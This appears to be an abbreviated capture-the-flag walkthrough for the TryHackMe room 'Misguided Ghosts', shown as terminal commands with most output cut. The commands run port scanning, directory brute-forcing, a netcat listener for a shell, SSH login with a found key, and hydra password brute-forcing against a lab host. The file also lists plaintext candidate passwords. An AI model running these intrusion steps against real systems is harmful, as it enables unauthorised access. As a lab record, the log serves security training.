...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ sudo nmap -A -sS -sC -sV -O 10.10.79.34
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ ftp 10.10.79.34
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ cat info.txt
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ cat jokes.txt
Taylor: Knock, knock.
Josh:   Who's there?
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -k 2>/dev/null
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ sudo python3 -m http.server 80
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ nc -lnvp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ grep -ie ^[a-z]*$ /usr/share/wordlists/rockyou.txt >> wordlist.txt
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ node vigenere_brute_force.js -w wordlist.txt -c NCB -u MII
----------------------------------------------
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ ssh -i id_rsa zac@10.10.118.136
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ smbclient -L localhost -p 1234
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ cat passwords.bak
pft7vPl
HQ@5Y64
Ls7kZxv
KPBRFJz
...
```
bibo318@parrot:~/CTFs/tryhackme/Misguided Ghosts$ hydra -l hayley -P passwords.bak ssh://10.10.118.136
